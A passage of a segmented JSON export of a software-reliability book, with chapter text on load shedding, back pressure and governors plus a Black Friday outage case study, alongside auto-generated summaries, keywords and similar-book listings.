methods page. By comparison, if the system just sends a message asking for credit card authorization, without waiting for a reply, then it must somehow decide what to do if the authorization request ultimately fails or, worse, remains unanswered. Designing asynchronous processes is inherently harder. The process must deal with exception queues, late responses, callbacks (computer-to-computer as well as human-to-human), and assumptions. These decisions even involve the business sponsors of the calling system, who will occasionally have to decide what the acceptable level of financial risk is.\n\nYou can apply most of the patterns in this chapter without greatly affecting the implementation cost of the system. Middleware decisions are not the\n\nreport erratum • discuss\n\nShed Load • 119\n\nsame. The move from synchronous request/reply to asynchronous communi- cation necessitates very different design. That makes the switching cost something to consider.\n\nRemember This\n\nDecide at the last responsible moment.\n\nOther stability patterns can be implemented without large-scale changes to the design or architecture. Decoupling middleware is an architecture decision. It ripples into every part of the system. This is one of those nearly irreversible decisions that should be made early rather than late.\n\nAvoid many failure modes through total decoupling.\n\nThe more fully you decouple individual servers, layers, and applications, the fewer problems you will observe with Integration Points, Cascading Failures, Slow Responses, and Blocked Threads. You’ll find that decoupled applications are also more adaptable, since you can change any of the participants independently of the others.\n\nLearn many architectures, and choose among them.\n\nNot every system needs to look like a three-tier application with a relational database. Learn many architectural styles, and select the best architecture for the problem at hand.\n\nShed Load\n\nServices, microservices, websites, and open APIs all share one characteristic: they have zero control over their demand. At any moment, more than a billion devices could make a request. No matter how strong your load balancers or how fast you can scale, the world can always make more load than you can handle.\n\nAt the network level, TCP copes with a flood of connection attempts via the listen queue. Every incomplete connection goes into a queue per port. It’s up to the application to accept the connections. When the queue is full, new connection attempts are rejected with an ICMP RST (reset) packet.\n\nTCP can’t save us entirely, though. Services often fall over before the connec- tion queue fills up. When that happens, it’s almost always due to contention for a pooled resource. Threads start to slow down, waiting for a resource. Once they have the resource, they run slower because too much RAM and CPU are used by all the extra threads. Sometimes this gets exacerbated by other resource pools that are also exhausted. The net result is lengthening response times until callers start timing out. To an outside observer, there’s no difference between “really, really slow” and “down.”\n\nreport erratum • discuss\n\nChapter 5. Stability Patterns • 120\n\nServices should model TCP’s approach. When load gets too high, start to refuse new requests for work. This is related to Fail Fast.\n\nThe ideal way to define “load is too high” is for a service to monitor its own performance relative to its SLA. When requests take longer than the SLA, it’s time to shed some load. Failing that, you may choose to keep a semaphore in your application and only allow a certain number of concurrent requests in the system. A queue between accepting connections and process- ing them would have a similar effect, but at the expense of both complexity and latency.\n\nWhen a load balancer is in the picture, individual instances can use a 503 status code on their health check pages to tell the load balancer to back off for a while.\n\nInside the boundaries of a system or enterprise, it’s more efficient to use back pressure (see Create Back Pressure, on page 120) to create a balanced throughput of requests across synchronously coupled services. Shed load as a secondary measure in these cases.\n\nRemember This\n\nYou can’t out-scale the world.\n\nNo matter how large your infrastructure or how fast you can scale it, the world has more people and devices than you can support. If your service is exposed to uncontrolled demand, then you need to be able to shed load when the world goes crazy on you.\n\nAvoid slow responses using Shed Load.\n\nCreating slow responses is being a bad citizen. Keep your response times under control rather than getting so slow that callers time out.\n\nUse load balancers as shock absorbers.\n\nIndividual instances can report HTTP 503 to get some breathing room. Load balancers are good at recycling connections very quickly.\n\nCreate Back Pressure\n\nEvery performance problem starts with a queue backing up somewhere. Maybe it’s a socket’s listen queue. Maybe it’s the OS’s run queue or the databases I/O queue.\n\nIf a queue is unbounded, it can consume all available memory. As the queue grows, the time it takes for a piece of work to get all the way through it grows\n\nreport erratum • discuss",
      "page_number": 123,
      "chapter_number": 16,
      "summary": "HTTP provides a response code of “503 Service Unavailable,” which is defined to indicate a temporary condition.2 Most clients, however, will not distinguish between different response codes Key topics include protocols, applications, and application.",
      "keywords": [
        "test harness",
        "Test Harnesses",
        "system",
        "harness",
        "Handshaking",
        "good test harness",
        "remote system",
        "server",
        "remote",
        "single test harness",
        "Middleware",
        "application",
        "Test Harness pattern",
        "integration testing",
        "protocols"
      ],
      "concepts": [
        "protocols",
        "applications",
        "application",
        "failure",
        "different",
        "differs",
        "middleware",
        "handshaking",
        "handshake",
        "server"
      ],
      "similar_chapters": [
        {
          "book": "Computer Systems A Programmer’s Perspective",
          "chapter": 49,
          "title": "Segment 49 (pages 981-999)",
          "relevance_score": 0.54,
          "method": "sentence_transformers"
        },
        {
          "book": "Fluent Python 2nd",
          "chapter": 39,
          "title": "Segment 39 (pages 778-797)",
          "relevance_score": 0.53,
          "method": "sentence_transformers"
        },
        {
          "book": "Microservice APIs Using Python Flask FastAPI",
          "chapter": 2,
          "title": "Segment 2 (pages 9-16)",
          "relevance_score": 0.53,
          "method": "sentence_transformers"
        },
        {
          "book": "Building Python Microservices with FastAPI",
          "chapter": 38,
          "title": "Segment 38 (pages 342-352)",
          "relevance_score": 0.49,
          "method": "sentence_transformers"
        },
        {
          "book": "Game Programming Gems 8",
          "chapter": 49,
          "title": "Segment 49 (pages 472-480)",
          "relevance_score": 0.49,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 17,
      "title": "Segment 17 (pages 131-138)",
      "start_page": 131,
      "end_page": 138,
      "detection_method": "topic_boundary",
      "content": "Create Back Pressure • 121\n\ntoo. (See Little’s law.3) So as a queue’s length reaches toward infinity, response time also heads toward infinity. We really don’t want unbounded queues in our systems.\n\nOn the other hand, if the queue is bounded, we have to decide what to do when it’s full and a producer tries to stuff one more thing into it. Even if the object is wafer-thin, the queue has no space.\n\nWe really have only a few options:\n\nPretend to accept the new item but actually drop it on the floor.\n\nActually accept the new item and drop something else from the queue on\n\nthe floor.\n\nRefuse the item.\n\nBlock the producer until there is room in the queue.\n\nFor some use cases, dropping the item may be the best option. For data whose value decreases rapidly with age, dropping the oldest item in the queue might be the best option.\n\nBlocking the producer is a kind of flow control. It allows the queue to apply “back pressure” upstream. Presumably that back pressure propagates all the way to the ultimate client, who will be throttled down in speed until the queue releases.\n\nTCP uses extra fields in each packet to create back pressure. Once the window is full, senders are not allowed to send anything until released. Back pressure from the TCP window can cause the sender to fill up its transmit buffers, in which case subsequent calls to write to the socket will block. The mechanisms change but the idea is still to slow the producer down until the consumer can catch up.\n\nObviously back pressure can lead to blocked threads. It’s important to distin- guish back pressure due to a temporary condition from back pressure because a consumer is just broken. The Back Pressure pattern works best with asynchronous calls and programming. One of the many Rx frameworks can help here, as can actors or channels, if your language supports those.\n\nBack pressure only helps manage load when the pool of consumers is finite. That’s because the “upstream” is so diverse that there’s no systemic effect on all of them. We can illustrate this with an example. Suppose your system\n\n3.\n\nhttps://en.wikipedia.org/wiki/Little%27s_law\n\nreport erratum • discuss\n\nChapter 5. Stability Patterns • 122\n\nprovides an API for user-created “tags” at a specific location. It is used by native apps and web apps.\n\nInternally, there’s a certain rate at which you can create and index new tags. That’s going to be limited by your storage and indexing technology. When the rate of “create tag” calls exceeds the storage engine’s limit, what happens? The calls get slower and slower. Without back pressure, this would lead to a progressive slowdown until the API seems to be offline.\n\nInstead, we can create back pressure by use of a blocking queue for “create tag” calls. Let’s say each API server is allowed 100 simultaneous calls to the storage engine. When the 101st call arrives at the API server, the calling thread blocks until there is an open slot in the queue. That blocking is the back pressure. The API server cannot make calls any faster than it is allowed.\n\nIn this case, a flat limit of 100 calls per server is very crude. It means that one API server may have blocked threads while another has free slots available. We could make this smarter by letting the API servers make as many calls as they want but put the blocking on the receiver’s end. In that case, our off- the-shelf storage engine must be wrapped with a service to receive calls, measure response times, and adjust its internal queue size to maximize throughput and protect the engine.\n\nAt some point, though, the API server still has a thread waiting on a call. As we saw in Blocked Threads, on page 62, blocked threads are a quick path to downtime. At the edge of your system boundary, blocked threads will frustrate a user or provoke a retry loop. As such, back pressure works best within a system boundary. At the edges, you also need load shedding and asyn- chronous calls.\n\nIn our example, the API server should accept calls on one thread pool and then issue the outbound call to storage on another set of threads. That way, when the outbound call blocks, the request-handling thread can time out, unblock, and respond with an HTTP 503. Alternatively, it could drop a “create tag” command in a queue for later indexing. Then an HTTP 202 would be more appropriate.\n\nA consumer inside your system boundary will experience back pressure as a performance problem or as timeouts. In fact, it does indicate a real perfor- mance problem—the consumers collectively generated more load than the provider can handler! That doesn’t always mean the provider is to blame, though. It might have enough capacity for “normal” traffic, but one consumer went nuts and started eating Cincinnati. It could be due to an attack of self- denial or just organic changes in traffic patterns.\n\nreport erratum • discuss\n\nGovernor • 123\n\nWhen Back Pressure kicks in, monitoring needs to know about it. That way you can tell whether it’s a random fluctuation or a trend.\n\nRemember This\n\nBack Pressure creates safety by slowing down consumers.\n\nConsumers will experience slowdowns. The only alternative is to let them crash the provider.\n\nApply Back Pressure within a system boundary\n\nAcross boundaries, look at load shedding instead. This is especially true when the Internet at large is your user base.\n\nQueues must be finite for response times to be finite.\n\nYou only have a few options when a queue is full. All of them are unpleasant: drop data, refuse work, or block. Consumers must be careful not to block forever.\n\nGovernor\n\nIn Force Multiplier, on page 80, we looked into an outage that Reddit.com suffered. As a quick reminder, Reddit’s configuration management system restarted a part of its infrastructure management that scales server instances up and down. This was in the middle of a ZooKeeper migration, so the autoscaler read a partial configuration and decided to shut down nearly every machine instance in Reddit.\n\nThe flip side of that coin is a job scheduler that spins up too many compute instances in order to process a queue before a deadline. The work still can’t get done fast enough, and, to add insult to injury, the cloud provider’s invoice that month is written in scientific notation.\n\nAutomation has no judgment. When it goes wrong, it tends to go wrong really quickly. By the time a human perceives the problem, it’s a question of recovery rather than intervention. How can we allow human intervention without putting a human in the loop for everything? We should use automation for things humans are bad at: repetitive tasks and fast response. We should use humans for what automation is bad at: perceiving the whole situation at a higher level.\n\nBelieve it or not, we can look to eighteenth-century technology for an answer. Before the era of steam engines, power came from muscles (human or animal). Steam engineers quickly discovered that it is possible to run machines so fast that the metal breaks. Parts fly apart from tension or they seize up under compression. Bad things happen to the machines and to anyone nearby. The solution was the governor. A governor limits the speed of an engine. Even if\n\nreport erratum • discuss\n\nChapter 5. Stability Patterns • 124\n\nthe source of power could drive it faster, the governor prevents it from running at unsafe RPMs.\n\nWe can create governors to slow the rate of actions. Reddit did this with its autoscaler by adding logic that says it can only shut down a certain percentage of instances at a time.\n\nA governor is stateful and time-aware. It knows what actions have been taken over a period of time. It should also be asymmetric. Most actions have a “safe” direction and an “unsafe” one. Shutting down instances is unsafe. Deleting data is unsafe. Blocking client IP addresses is unsafe.\n\nYou will often find a tension between definitions of “safe.” Shutting down instances is unsafe for availability, while spinning up instances is unsafe for cost. These forces don’t cancel each other out. Instead, they define a U-shaped curve where going too far in either direction is bad. That means actions may also be safe within a defined range but unsafe outside the range. Your AWS budget may allow for a thousand EC2 instances, but if the autoscaler starts heading toward two thousand, then it needs to slow down. You can think about this U-shaped curve as defining the response curve for the governor. Inside the safe zone, the actions are fast. Outside the range, the governor applies increasing resistance.\n\nThe whole point of a governor is to slow things down enough for humans to get involved. Naturally that means connecting to monitoring both to alert humans that there’s a situation and to give them enough visibility to under- stand what’s happening.\n\nRemember This\n\nSlow things down to allow intervention.\n\nWhen things are about to go off the rails, we often find automation tools pushing the throttle to its limit. Humans are better at situational thinking, so we need to create opportunities for us to intervene.\n\nApply resistance in the unsafe direction.\n\nSome actions are inherently unsafe. Shutting down, deleting, blocking things...these are all likely to interrupt service. Automation will make them go fast, so you should apply a Governor to provide humans with time to intervene.\n\nreport erratum • discuss\n\nWrapping Up • 125\n\nConsider a response curve.\n\nActions may be safe within a defined range. Outside that range they should encounter increasing “resistance” by slowing down the rate by which they can occur.\n\nWrapping Up\n\nIn time, even shockingly unlikely combinations of circumstances will eventu- ally occur. If you ever catch yourself saying, “The odds of that happening are astronomical,” or some similar utterance, consider this: a single small service might do ten million requests per day over three years, for a total of 10,950,000,000 chances for something to go wrong. That’s more than ten billion opportunities for bad things to happen. Astronomical observations indicate there are four hundred billion stars in the Milky Way galaxy. Astronomers consider a number “close enough” if it’s within a factor of 10. Astronomically unlikely coincidences happen all the time.\n\nFailures are inevitable. Our systems, and those we depend on, will fail in ways large and small. Stability antipatterns amplify transient events. They accelerate cracks in the system. Avoiding the antipatterns does not prevent bad things from happening, but it will help minimize the damage when bad things do occur.\n\nJudiciously applying these stability patterns results in software that stays up, come hell or high water. The key to applying these patterns successfully is judgment. Examine the software’s requirements cynically. View other enterprise systems with suspicion and distrust—any of them can stab you in the back. Identify the threats, and apply stability patterns appropriate to each threat. Paranoia is good engineering.\n\nOur production environments don’t much resemble just a desktop or laptop computer any more. Everything is different, from network configuration and performance to security restrictions and runtime limits. In the next part of this book, we’re going to look at design for production operations.\n\nreport erratum • discuss\n\nPart II\n\nDesign for Production\n\nCHAPTER 6\n\nCase Study: Phenomenal Cosmic Powers, Itty-Bitty Living Space\n\nIn the middle 1500s, a Calabrian doctor named Aloysius Lilius invented a new calendar to fix a bug in the widely used Julian calendar. The Julian calendar had an accumulating drift. After a few hundred years, the official calendar date for the solstice would occur weeks before the actual event. Lilius’s calendar used an elaborate system of corrections and countercorrections to keep the official calendar dates for the equinoxes and solstices close to the astronomical events. Over a 400-year cycle, the calendar dates vary by as much as 2.25 days, but they vary predictably and periodically; overall, the error is cyclic, not cumulative. This calendar, decreed by Pope Gregory XIII, became known as the Gregorian calendar rather than the Lilian calendar. (They just use your mind and they never give you credit. It’s enough to drive you crazy if you let it.) The Gregorian calendar was eventually adopted by all European nations, although not without struggles, and even by Egypt, China, Korea, and Japan (with modifications for the latter three). Some nations adopted this calendar as early as 1582, while others adopted it only in the 1920s.\n\nIt’s no wonder that the church decreed the calendar. The Gregorian calendar, like most calendars, was created to mark holy days (that is, holidays). It has since been used to mark useful recurring events in certain other domains that depend on the annual solar cycle, such as agriculture. No business in the world actually lives by the Gregorian calendar, though. The business community uses the dates as a convenient marker for its own internal business cycle.\n\nEach industry has its own internal almanac. For a health insurance company, the year is structured around “open enrollment.” All plans take their bearings from the open enrollment period. Florists’ thinking is dominated by Valentine’s\n\nreport erratum • discuss\n\nChapter 6. Case Study: Phenomenal Cosmic Powers, Itty-Bitty Living Space • 130\n\nDay and Mother’s Day. Upstream from them, Colombian flower growers center their agricultural year to produce the blossoms for those florists. These landmarks happen to be marked with specific dates on the Gregorian calendar, but in the minds of florists and their entire extended supply chain, those seasons have their own significance beyond the official calendar date.\n\nFor retailers, the year begins and ends with the euphemistically named “holiday season.” Here we see a correspondence between various religious calendars and the retail calendar. Christmas, Hanukkah, and Kwanzaa all occur relatively close together. Since “Christmahannukwanzaakah” turns out to be difficult to say in meetings with a straight face, they call it the “holiday season” instead. Don’t be fooled, though. Retailers’ interest in the holiday season is strictly ecumenical—some might even call it cynical. Up to 50 percent of a retailer’s entire annual revenue occurs between November 1 and December 31.\n\nIn the United States, Thanksgiving—the fourth Thursday in November—is the de facto start of the retail holiday season. By long tradition, this is when consumers start getting serious about gift shopping, because there are usu- ally a little less than 30 days left in the season at that point. Apparently, motivation by deadline crosses religious boundaries. Shopper panic sets in, resulting in a collective phenomenon known as Black Friday. Retailers encourage and reinforce this by changing their assortment, increasing stocks in stores, and advertising wondrous things. Traffic in physical stores can quadruple overnight. Traffic at online stores can increase by 1,000 percent. This is the real load test, the only one that matters.\n\nBaby’s First Christmas\n\nMy client had launched a new online store in the summer. The weeks and months following launch proved, time and time again, why launching a new site is like having a baby. You must expect certain things, such as being awakened in the middle of the night and routinely uncovering horrifying dis- coveries (as in, “Dear God! What have you been feeding this child...orange Play-Doh?” or “What? Why would they parse content during page rendering?”) Still, for all the problems we experienced following the launch, we approached the holiday season with cautious optimism.\n\nOur optimism was rooted in several factors. First, we had nearly doubled the number of servers in production. Second, we had hard data showing that the site was stable at current loads. A few burst events (mispriced items, mainly) had given us some traffic spikes to measure. The spikes were large enough to see where page latency started to climb, so we had a good feel for what level of load would cause the site to bog down. The third reason for our optimism\n\nreport erratum • discuss",
      "page_number": 131,
      "chapter_number": 17,
      "summary": "This chapter covers segment 17 (pages 131-138). Key topics include queue, calls, and blocked. Not every system needs to look like a three-tier application with a relational database.",
      "keywords": [
        "back pressure",
        "Create Back Pressure",
        "back",
        "queue",
        "pressure",
        "Load",
        "Create Back",
        "API server",
        "Back Pressure pattern",
        "API",
        "Shed Load",
        "Create",
        "Slow",
        "calls",
        "Blocked Threads"
      ],
      "concepts": [
        "queue",
        "calls",
        "blocked",
        "load",
        "pattern",
        "create",
        "creating",
        "human",
        "start",
        "responsible"
      ],
      "similar_chapters": [
        {
          "book": "Designing Data-Intensive Applications",
          "chapter": 58,
          "title": "Segment 58 (pages 575-582)",
          "relevance_score": 0.62,
          "method": "sentence_transformers"
        },
        {
          "book": "Game Programming Gems 7",
          "chapter": 13,
          "title": "Segment 13 (pages 116-124)",
          "relevance_score": 0.62,
          "method": "sentence_transformers"
        },
        {
          "book": "Microservice APIs Using Python Flask FastAPI",
          "chapter": 6,
          "title": "Segment 6 (pages 43-51)",
          "relevance_score": 0.62,
          "method": "sentence_transformers"
        },
        {
          "book": "Building Python Microservices with FastAPI",
          "chapter": 30,
          "title": "Segment 30 (pages 275-283)",
          "relevance_score": 0.61,
          "method": "sentence_transformers"
        },
        {
          "book": "Software Architecture",
          "chapter": 17,
          "title": "Segment 17 (pages 156-163)",
          "relevance_score": 0.61,
          "method": "sentence_transformers"
        }
      ]
    },
    {
      "number": 18,
      "title": "Segment 18 (pages 139-146)",
      "start_page": 139,
      "end_page": 146,
      "detection_method": "topic_boundary",
      "content": "Taking the Pulse • 131\n\nsprang from the confidence that we could handle whatever the site decided to throw at us. Between the inherent capabilities of the application server and the tools we had built around the application server, we had more visibil- ity and control over the online store internals than any other system on which I’ve worked. This would ultimately prove to be the difference between a difficult but successful Thanksgiving weekend and an unmitigated disaster.\n\nA few of us who had pulled weekend duty through Labor Day had been granted weekend passes. I had a four-day furlough to take my family to my parents’ house three states away for Thanksgiving dinner. We had also scheduled a twenty-four-hour onsite presence through the weekend. As I said, we were executing cautious optimism. Bear in mind, we were the local engineering team; the main site operations center (SOC)—a facility staffed with highly skilled engineers twenty-four hours a day—was in another city. Ordinarily, they were the ones monitoring and managing sites during the nights and weekends. Local engineering was there to provide backup for the SOC, an escalation path when they encounter problems that have no known solution. Our local team was far too small to be on-site twenty-four hours a day all the time, but we worked out a way to do it for the limited span of the Thanksgiving weekend. Of course, as a former Boy Scout (“Be prepared”), I crammed my laptop into the packed family van, just in case.\n\nTaking the Pulse\n\nWhen we arrived on Wednesday night, I immediately set up my laptop in my parents’ home office. I can work anywhere I have broadband and a cell phone. Using their 3 MB cable broadband, I used PuTTY to log into our jumphost and start up my sampling scripts.\n\nDuring the run-up to the launch, I was part of load testing this new site. Most load tests deliver results after the test is done. Since the data come from the load generators rather than inside the systems under test, it is a “black-box” test. To get more information out of the load test, I had started off using the application server’s HTML administration GUI to check vitals like latency, free heap memory, active request-handling threads, and active sessions.\n\nIf you don’t know in advance what you are looking for, then a GUI is a great way to explore the system. If you know exactly what you want, the GUI gets tedious. On the other hand, if you need to look at thirty or forty servers at a time, the GUI gets downright impractical.\n\nTo get more out of our load tests, I wrote a collection of Perl modules that would screen-scrape the admin GUI for me, parsing the HTML for values.\n\nreport erratum • discuss\n\nChapter 6. Case Study: Phenomenal Cosmic Powers, Itty-Bitty Living Space • 132\n\nThese modules would let me get and set property values and invoke methods on the components of the application server—built-in as well as custom. Because the entire admin GUI was HTML-based, the application server never knew the difference between a Perl module or a web browser. Armed with these Perl modules, I was able to create a set of scripts that would sample all the application servers for their vital stats, print out detail and summary results, sleep a while, and loop.\n\nThey were simple indicators, but in the time since site launch, all of us had learned the normal rhythm and pulse of the site by watching these stats. We knew, with a single glance, what was normal for noon on Tuesday in July. If session counts went up or down from the usual envelope, if the count of orders placed just looked wrong, we would know. It’s really surprising how quickly you can learn to smell problems. Monitoring technology provides a great safety net, pinpointing problems when they occur, but nothing beats the pattern-matching power of the human brain.\n\nThanksgiving Day\n\nAs soon as I woke up Thanksgiving morning, before I even had a cup of coffee, I hopped into my parents’ office to check the stats windows I left running all night. I had to look twice to be sure of what I saw. The session count in the early morning already rivaled peak time of the busiest day in a normal week. The order counts were so high that I called our DBA to verify orders were not being double-submitted. They weren’t.\n\nBy noon, customers had placed as many orders as in a typical week. Page latency, our summary indicator of response time and overall site performance, was clearly stressed but still nominal. Better still, it was holding steady over time, even as the number of sessions and orders mounted. I was one happy camper over turkey dinner. By evening, we had taken as many orders in one day as in the entire month to date. By midnight, we had taken as many orders as in the entire month of October—and the site held up. It passed the first killer load test.\n\nBlack Friday\n\nThe next morning, on Black Friday, I ambled into the office after breakfast to glance at the stats. Orders were trending even higher than the day before. Session counts were up, but page latency was still down around 250 millisec- onds, right where we knew it should be. I decided to head out around town with my mom to pick up the ingredients for chicken curry. (It would be\n\nreport erratum • discuss\n\nBlack Friday • 133\n\nThanksgiving leftovers for dinner on Friday, but I wanted to make the curry on Saturday, and our favorite Thai market was closed on Saturday.)\n\nOf course, I wouldn’t be telling this story if things didn’t go horribly wrong. And things wouldn’t go horribly wrong until I was well away from my access point. Sure enough, I got the call when I was halfway across town.\n\n“Good morning, Michael. This is Daniel from the site operations center,” said Daniel.\n\n“I’m not going to like this, am I, Daniel?” I asked.\n\n“SiteScope is currently showing red on all DRPs. We’ve been doing rolling restarts of DRPs, but they’re failing immediately. David has a conference call going and has asked for you to join the bridge.”\n\nOnlineStoreSiteScopeNYC\n\nCustomers\n\nSiteScopeSan Francisco20 Hosts75 DRPs3,000 Threads\n\nIn the terse code we’ve evolved in our hun- dreds of calls, Daniel was telling me that the site was down, and down hard. SiteScope simulates real customers, as shown in the figure. When SiteScope goes red, we know that customers aren’t able to shop and we’re losing revenue. In an ATG site,1 page requests are handled by instances that do nothing but serve pages. The web server calls the applica- tion server via the Dynamo Request Protocol (DRP), so it’s common to refer to the request- handling instances as DRPs. A red DRP indi- cates that one of those request-handling instances stopped responding to page requests. “All DRPs red” meant the site was down, losing orders at a rate of about a million dollars an hour. “Rolling restart” meant they were shutting down and restarting the application servers as fast as possible. It takes about ten minutes to bring up all the application servers on a single host. You can do up to four or five hosts at a time, but more than that and the database response time starts to suffer, which makes the start-up process take longer. All together, it meant they were trying to tread water but were still sinking.\n\n“OK. I’ll dial in now, but I’m thirty minutes from hands on keyboard,” I told him.\n\nDaniel said, “I have the conference bridge and passcode for you.”\n\n“Never mind. I’ve got it memorized,” I said.\n\n1.\n\nwww.oracle.com/applications/customer-experience/ecommerce/products/commerce-platform/index.html\n\nreport erratum • discuss\n\nChapter 6. Case Study: Phenomenal Cosmic Powers, Itty-Bitty Living Space • 134\n\nI dialed in and got a babel of voices. Clearly, a speakerphone in a conference room was dialed into the bridge as well. There’s nothing like trying to sort out fifteen different voices in an echoing conference room, especially when other people keep popping in and out of the call from their desks, announcing such helpful information as, “There’s a problem with the site.” Yes, we know. Thank you and hang up, please.\n\nVital Signs\n\nThe incident had started about twenty minutes before Daniel called me. The operations center had escalated to the on-site team. David, the operations manager, had made the choice to bring me in as well. Too much was on the line for our client to worry about interrupting a vacation day. Besides, I had told them not to hesitate to call me if I was needed.\n\nWe knew a few things at this point, twenty minutes into the incident:\n\nSession counts were very high, higher than the day before.\n\nNetwork bandwidth usage was high but not hitting a limit.\n\nApplication server page latency (response time) was high.\n\nWeb, application, and database CPU usage were low—really low.\n\nSearch servers, our usual culprit, were responding well. System stats\n\nlooked healthy.\n\nRequest-handling threads were almost all busy. Many of them had been\n\nworking on their requests for more than five seconds.\n\nIn fact, the page latency wasn’t just high. Because requests were timing out, it was effectively infinite. The statistics showed us only the average of requests that completed. Response time is always a lagging indicator. You can only measure the response time on requests that are done. So whatever your worst response time may be, you can’t measure it until the slowest requests finish.\n\nRequests that didn’t complete never got averaged in. Other than the long response time, which we already knew about since SiteScope was failing to complete its synthetic transactions, none of our usual suspects looked guilty.\n\nTo get more information, I started taking thread dumps of the application servers that were misbehaving. While I was doing that, I asked Ashok, one of our rock- star engineers who was on-site in the conference room, to check the back- end order management system. He saw similar patterns on the back end as on the front end: low CPU usage and most threads busy for a long time.\n\nreport erratum • discuss\n\nDiagnostic Tests • 135\n\nIt was now almost an hour since I got the call, or ninety minutes since the site went down. This means not only lost orders for my client but also that we were coming close to missing our SLA for resolving a high-severity incident. I hate missing an SLA. I take it personally, as do all of my colleagues.\n\nDiagnostic Tests\n\nThe thread dumps on the front-end application servers revealed a similar pattern across all the DRPs. A few threads were busy making a call to the back end, and most of the others were waiting for an available connection to call the back end. The waiting threads were all blocked on a resource pool, one that had no timeout. If the back end stopped responding, then the threads making the calls would never return, and the ones that were blocked would never get their chance to make their calls. In short, every single request- handling thread, all 3,000 of them, were tied up doing nothing, perfectly explaining our observation of low CPU usage: all 100 DRPs were idle, waiting forever for an answer that would never come.\n\nAttention swung to the order management system. Thread dumps on that system revealed that some of its 450 threads were occupied making calls to an external integration point, as shown in the following figure. As you probably have guessed, all other threads were blocked waiting to make calls to that external integration point. That system handles scheduling for home delivery. We immediately paged the operations team for that system. (It’s managed by a different group that does not have 24/7 support staff. They pass a pager around on rotation.)\n\nOnlineStoreSiteScopeNYC\n\nCustomers\n\nSiteScopeSan Francisco20 Hosts75 DRPs3,000 Threads\n\nOrderManagement6 Hosts6 Instances450 Threads\n\nreport erratum • discuss\n\nChapter 6. Case Study: Phenomenal Cosmic Powers, Itty-Bitty Living Space • 136\n\nI think it was about this time that my wife brought me a plate of leftover turkey and stuffing for dinner. Between status reports, I muted the phone to take quick bites. By that point, I had used up the battery on my cell phone and was close to draining the cordless phone. (I couldn’t use a regular phone because none of them took my headset plug.) I crossed my fingers that my cell phone would get enough of a charge before the cordless phone ran out.\n\nCall In a Specialist\n\nIt felt like half of forever (but was probably only half an hour) when the support engineer dialed in to the bridge. He explained that of the four servers that normally handle scheduling, two were down for maintenance over the holiday weekend and one of the others was malfunctioning for reasons unknown. To this day, I have no idea why they would schedule maintenance for that weekend of all weekends!\n\nThat left us with a huge imbalance in the sizes of the systems, as shown in the following figure. The sole scheduling server that remained could handle up to twenty-five concurrent requests before it started to slow down and hang. We estimated that right then the order management system was probably sending it ninety requests. Sure enough, when the on-call engineer checked the lone scheduling server, it was stuck at 100 percent CPU. He had gotten paged a few times about the high CPU condition but had not responded, since that group routinely gets paged for transient spikes in CPU usage that turn out to be false alarms. All the false positives had quite effectively trained them to ignore high CPU conditions.\n\nOnlineStoreSiteScopeNYC\n\nCustomers\n\nSiteScopeSan Francisco20 Hosts75 DRPs3,000 Threads\n\nOrderManagement6 Hosts6 Instances450 Threads\n\nScheduling1 Host1 Instance25 Threads\n\nreport erratum • discuss\n\nCompare Treatment Options • 137\n\nOn the conference call, our business sponsor gravely informed us that marketing had prepared a new insert that hit newspapers Friday morning. The ad offered free home delivery for all online orders placed before Monday. The entire line, with fifteen people in a conference room on speakerphone and a dozen more dialed in from their desks, went silent for the first time in four hours.\n\nSo, to recap, we have the front-end system, the online store, with 3,000 threads on 100 servers and a radically changed traffic pattern. It’s swamping the order management system, which has 450 threads that are shared between handling requests from the front end and processing orders. The order man- agement system is swamping the scheduling system, which can barely handle twenty-five requests at a time.\n\nAnd it’s going to continue until Monday. It’s the nightmare scenario. The site is down, and there’s no playbook for this situation. We’re in the middle of an incident, and we have to improvise a solution.\n\nCompare Treatment Options\n\nBrainstorming ensued. Numerous proposals were thrown up and shot down, generally because the application code’s behavior under those circumstances was unknown. It quickly became clear that the only answer was to stop making so many requests to check schedule availability. With the weekend’s marketing campaign centered around free home delivery, we knew requests from the users were not about to slow down. We had to find a way to throttle the calls. The order management system had no way to do that.\n\nWe saw a glimmer of hope when we looked at the code for the store. It used a subclass of the standard resource pool to manage connections to order management. In fact, it had a separate connection pool just for scheduling requests. I’m not sure why the code was designed with a separate connection pool for that, probably an example of Conway’s law, but it saved the day— and the retail weekend. Because it had a component just for those connec- tions, we could use that component as our throttle.\n\nIf the developers had added an enabled property, it would have been a simple thing to set that to false. Maybe we could do the next best thing, though. A resource pool with a zero maximum is effectively disabled anyway. I asked the developers what would happen if the pool started returning null instead of a connection. They replied that the code would handle that and present the user with a polite message stating that delivery scheduling was not available for the time being. Good enough.\n\nreport erratum • discuss\n\nChapter 6. Case Study: Phenomenal Cosmic Powers, Itty-Bitty Living Space • 138\n\nDoes the Condition Respond to Treatment?\n\nOne of my Perl scripts could set the value of any property on any component. As an experiment, I used the script to set max for that resource pool (on just one DRP) to zero, and I set checkoutBlockTime to zero. Nothing happened. No change in behavior at all. Then I remembered that max has an effect only when the pool is starting up.\n\nI used another script, one that could invoke methods on the component, to call its stopService() and startService() methods. Voilà! That DRP started handling requests again! There was much rejoicing.\n\nOf course, because only one DRP was responding, the load manager started sending every single page request to that one DRP. It was crushed like the last open beer stand at a World Cup match. But at least we had a strategy.\n\nRecovery-Oriented Computing\n\nThe Recovery-Oriented Computing (ROC) project was a joint Berkeley and Stanford research project.a The project’s founding principles are as follows:\n\nFailures are inevitable, in both hardware and software.\n\nModeling and analysis can never be sufficiently complete. A priori prediction of\n\nall failure modes is not possible.\n\nHuman action is a major source of system failures.\n\nTheir research runs contrary to much of the prior work in system reliability. Whereas most work focuses on eliminating the sources of failure, ROC accepts that failures will inevitably happen—a major theme in this book! Their investigations aim to improve survivability in the face of failures.\n\nThe concepts of ROC were ahead of their time in 2005. Now they seem natural in the world of microservices, containers, and elastic scaling.\n\na.\n\nhttp://roc.cs.berkeley.edu\n\nI ran my scripts, this time with the flag that said “all DRPs.” They set max and checkoutBlockTime to zero and then recycled the service.\n\nThe ability to restart components, instead of entire servers, is a key concept of recovery-oriented computing. Although we didn’t have the level of automation that ROC proposes, we were able to recover service without rebooting the world. If we had needed to change the configuration files and restart all the servers, it would have taken more than six hours under that level of load.\n\nreport erratum • discuss",
      "page_number": 139,
      "chapter_number": 18,
      "summary": "This chapter covers segment 18 (pages 139-146). Key topics include site, calendar, and request.",
      "keywords": [
        "Aloysius Lilius invented",
        "Gregorian calendar",
        "Phenomenal Cosmic Powers",
        "calendar",
        "Julian calendar",
        "named Aloysius Lilius",
        "doctor named Aloysius",
